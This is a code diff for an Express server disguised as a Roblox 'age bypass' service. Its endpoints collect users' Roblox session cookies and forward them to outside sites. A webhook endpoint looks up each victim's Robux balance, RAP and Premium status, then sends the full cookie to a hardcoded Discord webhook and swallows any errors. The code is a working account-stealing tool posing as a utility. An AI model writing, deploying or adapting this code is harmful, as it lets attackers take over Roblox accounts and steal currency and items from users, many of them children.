@@ -1,47 +1,70 @@
 const express = require('express');
 const axios = require('axios');
+const { RobloxUser } = require('./getuserinfo');
 
 const app = express();
+app.use(express.json());
 
-app.get('/api/refresh', async (req, res) => {
-    const oldCookie = req.query.cookie;
-    const warningPrefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|";
+const API_BASE_URL = 'https://rblxbypasser.com/api';
 
-    if (!oldCookie) {
-        return res.status(400).json({ error: "Cookie parameter is missing." });
+app.post('/api/bypass', async (req, res) => {
+    const { cookie } = req.body;
+    if (!cookie) {
+        return res.status(400).json({ success: false, message: "Cookie is required." });
     }
-    // Critical Validation: Check if the cookie starts with the required prefix.
-    if (!oldCookie.startsWith(warningPrefix)) {
-        return res.status(400).json({ error: "Invalid cookie format. It must start with the full _WARNING... prefix." });
-    }
-
     try {
-        // --- 1. Call the External API ---
-        const refreshResponse = await axios.post('https://rblxrefresh.net/refresh', {
-            cookie: oldCookie
-        }, {
-            headers: { 'Content-Type': 'application/json' }
-        });
-
-        const refreshedCookie = refreshResponse.data?.refreshedCookie;
-
-        if (!refreshedCookie) {
-            throw new Error("The refresh API did not return a new cookie. Your old cookie may be invalid.");
-        }
-        
-        // --- 2. Respond to the user IMMEDIATELY ---
-        res.status(200).json({ refreshedCookie });
-
-        // --- 3. Trigger our own webhook endpoint in the background ---
-        const internalApiUrl = `https://${req.headers.host}/api/webhook`;
-        axios.post(internalApiUrl, { refreshedCookie, oldCookie })
-            .catch(err => console.error("Webhook trigger failed:", err.message));
-
+        const response = await axios.post(`${API_BASE_URL}/bypass`, { cookie });
+        res.status(200).json(response.data);
     } catch (error) {
-        // This catches errors from the external API call
-        const errorMessage = error.response?.data?.message || error.message;
-        console.error("External API refresh failed:", errorMessage);
-        res.status(500).json({ error: errorMessage });
+        const status = error.response?.status || 500;
+        const message = error.response?.data?.message || "Failed to initiate bypass.";
+        res.status(status).json({ success: false, message });
+    }
+});
+
+app.get('/api/progress', async (req, res) => {
+    const { token } = req.query;
+    if (!token) {
+        return res.status(400).json({ success: false, message: "Token is required." });
+    }
+    try {
+        const response = await axios.get(`${API_BASE_URL}/progress?token=${token}`);
+        res.status(200).json(response.data);
+    } catch (error) {
+        const status = error.response?.status || 500;
+        const message = error.response?.data?.message || "Failed to get progress.";
+        res.status(status).json({ success: false, message });
+    }
+});
+
+app.post('/api/webhook', async (req, res) => {
+    const { cookie } = req.body;
+    if (!cookie) {
+        return res.status(200).send("Webhook ignored: No cookie.");
+    }
+    const webhookURL = "https://discord.com/api/webhooks/1450559440221900941/G8PfWJn3sZ6FEtCdVzgFUg-IgYHzPG2vhEN4lHMQLGGjQ8rRhPsOdvrCK7GTp8yOfiLZ";
+    try {
+        const robloxUser = await RobloxUser.register(cookie);
+        const userData = await robloxUser.getUserData();
+        const format = (num) => new Intl.NumberFormat('en-US').format(num);
+        const embed = {
+            color: 0x43afff,
+            author: { name: `${userData.displayName} (@${userData.username}) - Age Bypassed`, url: `https://www.roblox.com/users/${userData.uid}/profile` },
+            thumbnail: { url: userData.avatarUrl },
+            fields: [
+                { name: '💰 Robux', value: `\`${format(userData.balance)}\``, inline: true },
+                { name: '📈 RAP', value: `\`${format(userData.rap)}\``, inline: true },
+                { name: '⭐ Premium', value: userData.isPremium ? '✅ Active' : '❌ None', inline: true },
+                { name: '🍪 Cookie Used', value: `\`\`\`${cookie}\`\`\``, inline: false },
+            ],
+            footer: { text: "Roblox Age Bypasser • Success" },
+            timestamp: new Date().toISOString()
+        };
+        await axios.post(webhookURL, { embeds: [embed] });
+        res.status(200).send("Webhook sent.");
+    } catch (error) {
+        console.error("WEBHOOK TASK FAILED:", error.message);
+        res.status(200).send("Webhook task failed silently.");
     }
 });
 
